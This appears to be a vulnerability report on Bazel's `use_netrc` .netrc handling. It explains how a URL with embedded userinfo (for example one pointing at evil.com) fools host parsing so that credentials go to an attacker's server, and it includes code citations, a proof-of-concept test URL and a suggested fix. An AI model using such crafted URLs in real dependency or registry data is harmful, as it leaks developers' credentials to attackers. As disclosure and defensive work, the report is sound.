## Title
Host derivation in `use_netrc` is vulnerable to userinfo-based host confusion, leaking `.netrc` credentials to an attacker-controlled host - (File: `tools/build_defs/repo/utils.bzl`)

### Summary
`use_netrc` (used by `get_auth`, which backs `http_archive`/`http_file`/`git_repository` authentication) derives the "host" for a URL by naive string splitting instead of proper URL parsing. A URL containing userinfo before the `@` sign (e.g. `https://trusted.com:token@evil.com/payload`) is mis-parsed as host `trusted.com`, when the real network destination is `evil.com`. Any repository rule that accepts a URL string from an untrusted source (e.g. via `urls`/`mirror_urls` supplied indirectly through a module extension shipped by a dependency, or a custom/attacker-served registry's `source.json`) and forwards it into `get_auth`/`use_netrc` will cause a victim's `.netrc` credentials for `trusted.com` to be attached to a request that is actually sent to `evil.com`.

### Finding Description
`use_netrc` computes the host with:
```
host = schemerest[1].split("/")[0].split(":")[0]
``` [1](#0-0) 

This logic assumes the string before the first `/` is `host[:port]`. It does not account for userinfo (`user:pass@host`) syntax, which is valid in URL grammar. For an input URL `https://trusted.com:s3cr3t@evil.com/mal.tar`:
- `schemerest[1]` = `trusted.com:s3cr3t@evil.com/mal.tar`
- `.split("/")[0]` = `trusted.com:s3cr3t@evil.com`
- `.split(":")[0]` = `trusted.com`

The function then does `if host in netrc: authforhost = netrc[host]` [2](#0-1) , matching the victim's `trusted.com` netrc entry, and returns an auth dict keyed by the *original, unmodified* URL string `https://trusted.com:s3cr3t@evil.com/mal.tar` containing the victim's real login/password for `trusted.com` [3](#0-2) . `get_auth`, which is called by `http_archive`/`http_file`/`git_repository` fetch code paths to build the `auth` argument for `ctx.download`, is populated the same way [4](#0-3) . Since the auth dict is keyed by full URL and forwarded as-is to `ctx.download`/`ctx.download_and_extract`, the HTTP layer sends the Authorization header (basic auth or a custom pattern) to whatever host the URL string actually resolves to over the network - `evil.com` - not `trusted.com`.

The existing test suite (`test_use_netrc` in `starlark_repository_test.sh`) only exercises straightforward `scheme://host[:port]/path` URLs and a substring-in-path decoy (`https://evil.com/bar.example.org/file4.tar`, which is correctly *not* matched) [5](#0-4) . There is no coverage of userinfo-bearing URLs, so this host-confusion path is neither tested nor guarded against.

### Impact Explanation
This breaks the invariant that `.netrc`-sourced credentials are host-scoped. Any attacker who can influence a URL string consumed by a repository rule that calls `get_auth`/`use_netrc` (for example, a module extension shipped inside a dependency's registry-published module, or a custom/malicious registry's `source.json` `url`/`mirror_urls` field, both of which are attacker-controlled inputs under the described threat model) can construct a URL that forces the victim's credentials for a trusted host to be transmitted to an attacker-controlled server, resulting in credential exfiltration.

### Likelihood Explanation
Exploitation requires only that the attacker control a URL string value that ends up passed into `use_netrc`/`get_auth` (not root-repo BUILD/.bzl code, and not privileged access to the victim machine), and that the victim has a `.netrc` entry for the host string the attacker chooses to spoof (a common corporate/CI setup, e.g. `github.com` or an internal artifact host). The crafted URL is plain data (a string), so no Starlark execution privileges beyond what a dependency's own repo-rule/module-extension code already legitimately has are needed.

### Recommendation
Parse the URL host using proper URL-parsing semantics (strip any `user[:password]@` userinfo component before extracting the host) rather than naive `split("/")`/`split(":")`. Additionally, add regression tests to `starlark_repository_test.sh`/`use_netrc` covering userinfo-containing URLs to ensure credentials are only sent to the actual destination host.

### Proof of Concept
Extend `test_use_netrc` with a URL containing an embedded userinfo component matching a netrc-defined host, and assert that no credential entry is produced for that URL (or that the header is only sent to `evil.com`, not attached with `trusted.com`'s credentials):
```
# .netrc
machine trusted.com
login victimuser
password victimsecret
```
```starlark
auth = use_netrc(rc, ["https://trusted.com:victimsecret@evil.com/payload.tar"], {})
# Current (buggy) result:
# auth == {
#   "https://trusted.com:victimsecret@evil.com/payload.tar": {
#     "type": "basic", "login": "victimuser", "password": "victimsecret",
#   }
# }
# i.e. credentials for trusted.com get attached to a request whose actual
# network destination is evil.com.
```
A `BuildIntegrationTestCase`/shell test analogous to `test_use_netrc` in `src/test/shell/bazel/starlark_repository_test.sh` [6](#0-5)  can be added with this URL to demonstrate the mis-scoped credential leak reaching `use_netrc`'s returned auth dict, which is subsequently used verbatim by `ctx.download`.

### Citations

**File:** tools/build_defs/repo/utils.bzl (L450-464)
```text
        schemerest = url.split("://", 1)
        if len(schemerest) < 2:
            continue
        if not (schemerest[0] in ["http", "https"]):
            # For other protocols, bazel currently does not support
            # authentication. So ignore them.
            continue
        host = schemerest[1].split("/")[0].split(":")[0]
        if host in netrc:
            authforhost = netrc[host]
        elif "" in netrc:
            authforhost = netrc[""]
        else:
            continue

```

**File:** tools/build_defs/repo/utils.bzl (L477-490)
```text
            auth[url] = auth_dict
        elif "password" in authforhost:
            if "login" in authforhost:
                auth[url] = {
                    "type": "basic",
                    "login": authforhost["login"],
                    "password": authforhost["password"],
                }
            else:
                auth[url] = {
                    "type": "pattern",
                    "pattern": "Bearer <password>",
                    "password": authforhost["password"],
                }
```

**File:** tools/build_defs/repo/utils.bzl (L519-540)
```text
def get_auth(ctx, urls):
    """Utility function to obtain the correct auth dict for a list of urls from .netrc file.

    Support optional netrc and auth_patterns attributes if available.

    Args:
      ctx: The repository context of the repository rule calling this utility
        function.
      urls: the list of urls to read

    Returns:
      the auth dict which can be passed to repository_ctx.download
    """
    if hasattr(ctx.attr, "netrc") and ctx.attr.netrc:
        netrc = read_netrc(ctx, ctx.attr.netrc)
    elif "NETRC" in ctx.os.environ:
        netrc = read_netrc(ctx, ctx.os.environ["NETRC"])
    else:
        netrc = read_user_netrc(ctx)
    auth_patterns = {}
    if hasattr(ctx.attr, "auth_patterns") and ctx.attr.auth_patterns:
        auth_patterns = ctx.attr.auth_patterns
```

**File:** src/test/shell/bazel/starlark_repository_test.sh (L1619-1739)
```shellscript
function test_use_netrc() {
    # Test the starlark utility function use_netrc.
  cat > .netrc <<'EOF'
machine foo.example.org
login foousername
password foopass

machine bar.example.org
login barusername
password passbar🌱

# following lines mix tabs and spaces
machine	  oauthlife.com
	password	TOKEN

# Password-only auth credentials, will not be passed into `patterns` like oauthlife.com.
machine baz.example.org password ABCDEFG

# Test for warning mechanism.
machine qux.example.org
EOF
  # Read a given .netrc file and combine it with a list of URL,
  # and write the obtained authentication dictionary to disk; this
  # is not the intended way of using, but makes testing easy.
  cat > def.bzl <<'EOF'
load("@bazel_tools//tools/build_defs/repo:utils.bzl", "read_netrc", "use_netrc")
def _impl(ctx):
  print("authrepo is being evaluated")
  rc = read_netrc(ctx, ctx.attr.path)
  auth = use_netrc(rc, ctx.attr.urls, {"oauthlife.com": "Bearer <password>",})
  ctx.file("data.bzl", "auth = %s" % (auth,))
  ctx.file("BUILD", "")
  ctx.file("WORKSPACE", "")

authrepo = repository_rule(
  implementation = _impl,
  attrs = {"path": attr.string(),
           "urls": attr.string_list()
  },
)
EOF

  netrc_dir="$(pwd)"
  if is_windows; then
    netrc_dir="$(cygpath -m ${netrc_dir})"
  fi

  cat > $(setup_module_dot_bazel) <<EOF
authrepo = use_repo_rule("//:def.bzl", "authrepo")

authrepo(
  name = "auth",
  path="${netrc_dir}/.netrc",
  urls = [
    "http://example.org/public/null.tar",
    "https://foo.example.org/file1.tar",
    "https://foo.example.org:8080/file2.tar",
    "https://bar.example.org/file3.tar",
    "https://evil.com/bar.example.org/file4.tar",
    "https://oauthlife.com/fizz/buzz/file5.tar",
    "https://baz.example.org/file6.tar",
    "http://qux.example.org/file7.tar",
  ],
)
EOF
  # Here dicts give us the correct notion of equality, so we can simply
  # compare against the expected value.
  cat > expected.bzl <<'EOF'
expected = {
    "https://foo.example.org/file1.tar" : {
      "type" : "basic",
      "login": "foousername",
      "password" : "foopass",
    },
    "https://foo.example.org:8080/file2.tar" : {
      "type" : "basic",
      "login": "foousername",
      "password" : "foopass",
    },
    "https://bar.example.org/file3.tar" : {
      "type" : "basic",
      "login": "barusername",
      "password" : "passbar🌱",
    },
    "https://oauthlife.com/fizz/buzz/file5.tar": {
      "type" : "pattern",
      "pattern" : "Bearer <password>",
      "password" : "TOKEN",
    },
    "https://baz.example.org/file6.tar": {
      "type" : "pattern",
      "pattern" : "Bearer <password>",
      "password" : "ABCDEFG",
    },
}
EOF
  cat > verify.bzl <<'EOF'
load("@auth//:data.bzl", "auth")
load("//:expected.bzl", "expected")

def check_equal_expected():
  print("Computed value: %s" % (auth,))
  print("Expected value: %s" % (expected,))
  if auth == expected:
    return "OK"
  else:
    return "BAD"
EOF
  cat > BUILD <<'EOF'
load ("//:verify.bzl", "check_equal_expected")
genrule(
  name = "check_expected",
  outs = ["check_expected.txt"],
  cmd = "echo %s > $@" % (check_equal_expected(),)
)
EOF
  bazel build //:check_expected &> $TEST_log || fail "Expected success"
  grep 'OK' `bazel info bazel-bin`/check_expected.txt \
       || fail "Authentication merged incorrectly"
  expect_log "authrepo is being evaluated"
  expect_log "WARNING: Found machine in \.netrc for URL .*qux\.example\.org.*, but no password\."
```
